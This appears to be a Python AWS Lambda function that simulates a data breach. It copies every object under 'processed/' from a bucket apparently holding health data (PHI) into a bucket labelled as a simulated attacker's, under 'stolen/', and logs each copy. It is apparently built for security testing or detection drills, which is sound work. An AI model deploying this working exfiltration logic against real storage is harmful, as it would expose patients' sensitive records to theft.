import json
import boto3
import os
import logging

logger = logging.getLogger()
logger.setLevel(logging.INFO)

s3 = boto3.client('s3')
SOURCE_BUCKET = os.environ.get('SOURCE_BUCKET', 'phi-processed-bucket-sotonye1')
EXFIL_BUCKET = os.environ.get('EXFIL_BUCKET', 'simulated-attacker-bucket-sotonye1')

def lambda_handler(event, context):
    paginator = s3.get_paginator('list_objects_v2')
    pages = paginator.paginate(Bucket=SOURCE_BUCKET, Prefix='processed/')
    exfil_count = 0
    
    for page in pages:
        for obj in page.get('Contents', []):
            key = obj['Key']
            s3.copy_object(
                Bucket=EXFIL_BUCKET,
                CopySource={'Bucket': SOURCE_BUCKET, 'Key': key},
                Key=f'stolen/{key}'
            )
            exfil_count += 1
            logger.info(f'EXFIL_COPY src={key} dst={EXFIL_BUCKET}/stolen/{key}')
    
    logger.warning(f'EXFIL_COMPLETE count={exfil_count}')
    return {'statusCode': 200, 'exfilCount': exfil_count}